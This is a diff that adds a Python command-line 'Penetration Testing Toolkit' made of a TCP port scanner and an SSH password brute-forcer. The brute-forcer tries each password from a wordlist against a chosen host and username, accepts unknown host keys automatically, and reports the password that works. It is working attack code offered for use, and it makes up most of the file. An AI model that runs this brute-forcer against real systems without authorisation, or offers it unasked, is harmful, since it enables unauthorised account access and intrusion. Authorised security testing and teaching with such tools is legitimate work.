@@ -1,0 +1,108 @@
+import socket
+import paramiko
+
+class PortScanner:
+    """
+    A simple port scanner class to check for open ports on a target host.
+    """
+
+    def __init__(self, target):
+        """
+        Initializes the PortScanner with the target IP address.
+
+        :param target: The target IP address or hostname.
+        """
+        self.target = target
+
+    def scan(self, start_port, end_port):
+        """
+        Scans a range of ports on the target host.
+
+        :param start_port: The starting port number.
+        :param end_port: The ending port number.
+        """
+        print(f"Scanning {self.target} from port {start_port} to {end_port}...")
+        for port in range(start_port, end_port + 1):
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(1)
+                result = sock.connect_ex((self.target, port))
+                if result == 0:
+                    print(f"Port {port} is open")
+                else:
+                    print(f"Port {port} is closed")
+
+
+class BruteForcer:
+    """
+    A simple brute-force password cracker for SSH.
+    """
+
+    def __init__(self, target, username, password_list):
+        """
+        Initializes the BruteForcer with target details.
+
+        :param target: The target IP address or hostname.
+        :param username: The username for SSH login.
+        :param password_list: A list of passwords to try.
+        """
+        self.target = target
+        self.username = username
+        self.password_list = password_list
+
+    def brute_force(self):
+        """
+        Attempts to brute-force the SSH login using the provided password list.
+        """
+        for password in self.password_list:
+            print(f"Trying password: {password}")
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.target, username=self.username, password=password)
+                print(f"Password found: {password}")
+                client.close()
+                return password
+            except paramiko.AuthenticationException:
+                print(f"Password {password} failed.")
+            except Exception as e:
+                print(f"Error: {e}")
+                break
+        print("Brute force attack finished.")
+
+
+def main():
+    """
+    Main function to run the penetration testing toolkit.
+    """
+    print("Welcome to the Penetration Testing Toolkit")
+    print("1. Port Scanner")
+    print("2. Brute Forcer")
+    choice = input("Select a module (1 or 2): ")
+
+    if choice == '1':
+        target = input("Enter the target IP address: ")
+        start_port = int(input("Enter the start port: "))
+        end_port = int(input("Enter the end port: "))
+        scanner = PortScanner(target)
+        scanner.scan(start_port, end_port)
+
+    elif choice == '2':
+        target = input("Enter the target IP address: ")
+        username = input("Enter the username: ")
+        password_list_path = input("Enter the path to the password list file: ")
+
+        try:
+            with open(password_list_path, 'r') as file:
+                passwords = [line.strip() for line in file.readlines()]
+
+            brute_forcer = BruteForcer(target, username, passwords)
+            brute_forcer.brute_force()
+        except FileNotFoundError:
+            print("Password list file not found. Please check the path.")
+
+    else:
+        print("Invalid choice. Exiting.")
+
+
+if __name__ == "__main__":
+    main()
